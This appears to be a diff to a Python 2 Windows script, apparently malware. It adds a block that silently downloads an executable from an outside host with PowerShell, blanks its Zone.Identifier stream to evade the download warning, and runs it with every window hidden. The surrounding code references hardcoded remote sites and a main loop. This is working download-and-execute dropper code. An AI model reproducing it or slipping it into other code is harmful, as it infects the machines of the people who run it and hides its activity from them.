@@ -113,6 +113,13 @@ except Exception,e:
     text_file.write(str(e))
     text_file.close()
     print str(e)
+try:
+    if not os.path.exists('c:\\windows\\wup.exe'):
+        subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://plano.xoom.it/wofficeie.exe" -OutFile '+suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
+        subprocess.call('echo.>'+suser+'\\wofficeie.exe:Zone.Identifier', creationflags=CREATE_NO_WINDOW) 
+        subprocess.call(suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
+except Exception,e:
+    print str(e)
 #main loop here
 site="paner.altervista.org"
 site1="paner.altervista.org"
